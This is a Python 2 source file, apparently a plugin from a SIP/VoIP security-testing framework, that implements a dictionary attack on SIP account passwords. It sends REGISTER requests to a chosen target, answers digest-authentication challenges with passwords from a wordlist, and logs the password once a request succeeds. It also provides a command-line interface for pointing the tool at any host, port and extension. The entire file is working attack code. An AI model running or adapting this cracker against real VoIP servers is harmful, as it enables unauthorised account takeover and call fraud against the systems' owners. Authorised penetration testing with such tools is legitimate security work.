#!/usr/bin/env python
import re
import os
import sys
import time
import socket
import random
from binascii import a2b_hex, b2a_hex
from argparse import ArgumentParser
from SIPutils.iterators import fileLineIterator
from SIPutils.packet import makeRequest, parsePkt, createTag, decodeTag
from SIPutils.siplet import SipLet
from SIPutils.response_codes import *

AUTHOR="""d0hm4t06 3. d0p91m4"""
AUTHOR_EMAIL="""gmdopp@gmail.com"""
DESCRIPTION="""Plugin to crack SIP accounts, given known usernames/extensions"""

ROOTDIR="""."""

def targetrule(target):
    if target.getCategory() != 'TARGET_SIP_USER':
        return False
    return target.get('authentication') == 'reqauth'


class SipCracker(SipLet):
    """
    CRACKER FOR SIP PASSWORDS
    """
    def genNewRequest(self): 
        """
        Generate next request to fire on target SIP UAS
        """
        toaddr = fromaddr = '"%s" <sip:%s@%s>' %(self._username,self._username,self._targetip)
        contact = 'sip:%s@%s' %(self._username,self._targetip)
        if not self._testreqsent:
            self._testreqsent = True
            self.logDebug('sending test request')
            reqpkt = makeRequest('REGISTER',
                                      self._targetip,
                                      self._targetport,  
                                      self._externalip,
                                      self._localport,
                                      toaddr,
                                      fromaddr,
                                      extension=self._username, 
                                      cseqnum=1)
            return ((self._targetip,self._targetport), reqpkt)
        localtag = None
        cseqnum = 1
        if len(self._challenges) > 0:
            nextpasswd = self.getNextScanItem()
            if nextpasswd is None:
                return
            self.logDebug('trying password: %s' %nextpasswd)
            localtag = createTag('%s:%s' %(self._username,nextpasswd), '\xDEADBEEF') # self.createTag(nextpasswd)
            auth = dict()
            auth['username'] = self._username
            auth['realm'] = self._realm
            auth['algorithm'] = self._digestalgorithm
            if self._reusenonce:
                auth['nonce'] = self._staticnonce
                callid = self._staticcallid
            else:
                auth['nonce'], callid = self._challenges.pop()
                auth['proxy'] = self._targetisproxy
                auth['password'] = nextpasswd
                cseqnum = 2
        else:
            auth = None
            callid = None
        reqpkt = makeRequest('REGISTER',
                             self._targetip,
                             self._targetport,  
                             self._externalip,
                             self._localport,
                             toaddr,
                             fromaddr,
                             extension=self._username, 
                             callid=callid,
                             contact=contact,
                             cseqnum=cseqnum,
                             localtag=localtag,
                             auth=auth)
        return ((self._targetip,self._targetport), reqpkt)

    def callback(self, srcaddr, pkt):
        metadata = parsePkt(pkt)
        if metadata['code'] == PROXYAUTHREQ:
            self._targetisproxy = True
        elif metadata['code'] == AUTHREQ:
            self._targetisproxy = False
        if metadata.has_key('auth-header'):
            if self._realm is None:
                self._realm = metadata['auth-header']['realm']
            if self._digestalgorithm is None:
                self._digestalgorithm = metadata['auth-header']['algorithm']
            if None not in [metadata['auth-header'][key] for key in ['realm', 'nonce']]:
                if self._reusenonce:
                    if len(self._challenges) > 0:
                        return # nothx new !
                    else:
                        self._staticnonce = metadata['auth-header']['nonce']
                        self._staticcallid = metadata['headers']['Call-ID']
                self._challenges.append((metadata['auth-header']['nonce'],metadata['headers']['Call-ID']))
        elif metadata['code'] == OKAY:
            self._passwordcracked = True
            self._noneedtocontinue = True
            match = re.search('tag=([+\.;:a-zA-Z0-9]*)',metadata['headers']['From'])
            assert not match is None, "No 'From' tag: Remote SIP UAC 'ate' our tag!"
            tag = match.group(1)
            creds = decodeTag(tag, '\xDEADBEEF').split(':')
            assert (not creds is None) and 0 < len(creds) < 3, "couln't not decode to tag: %s" %(tag)
            self.logDebug("'%s' response received" %(metadata['respfirstline']))
            if len(creds) > 1:
                self.logInfo("the password for user/extension '%s' is '%s'" %(creds[0],creds[1])) # XXX report vuln/info
            else:
                self.logInfo("user/extension '%s' is passwordless" %creds[0]) # XXX report vuln/info ?
        elif metadata['code'] == NOTFOUND:
            self.logWarning("received fatal response '%s' for user/extension '%s'" %(metadata['respfirstline'],self._username))
            self._noneedtocontinue = True
        elif metadata['code'] == INVALIDPASS:
            pass
        elif metadata['code'] == TRYING:
            pass
        else:
            self.logWarning("Got unknown response '%s'" %(metadata['respfirstline']))
            self._nomoretoscan = True
                         
    def execute(self, targetip, targetport, extension, dictionary):
        self._targetip = targetip
        self._targetport = targetport
        self._username = extension
        self._realm = None
        self._digestalgorithm = None
        self._scaniter = fileLineIterator(dictionary)
        self._targetisproxy = False
        self._reusenonce = False
        self._passwordcracked = False
        self._challenges = list()
        self._testreqsent = False
        self.mainLoop()
        if not self._passwordcracked:
            self.logInfo("could'nt crack password for '%s" %(self._username))


def run(target, pcallback):
    sipcracker = SipCracker(pcallback=pcallback)
    dictionary = open('%s/etc/SIP/wordlists/dummy_usernames.txt'%ROOTDIR, 'r')
    sipcracker.execute(target.get('ip'), target.get('port'), target.get('username'), dictionary)

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--target', '-t',
                   action='store',
                   dest='target',
                   default=None,
                   help="""specify target hostname/ip (option must be specified)""")
    parser.add_argument('--port', '-p',
                   action='store',
                   default=None,
                   dest='port',
                   help="""specify target port (option must be specified)""")
    parser.add_argument('--username', '-u',
                   action='store',
                   dest='username',
                   default=None,
                   help="""specify target SIP username for target SIP account crack (option must be specified)""")
    parser.add_argument('--dictionary', '-d',
                        action='store',
                        dest='dictionary',
                        default=None,
                        help="""specify a password wordlist to use (option must be specified)""")
    options = parser.parse_args()
    for option in options.__dict__:
        if getattr(options, option) is None:
            print 'error: option --%s must be specified' %(option)
            parser.print_help()
            sys.exit(1)
    sipcracker = SipCracker()
    dictionary = open(options.dictionary, 'r')
    sipcracker.execute(options.target, int(options.port), options.username, dictionary)
            
            
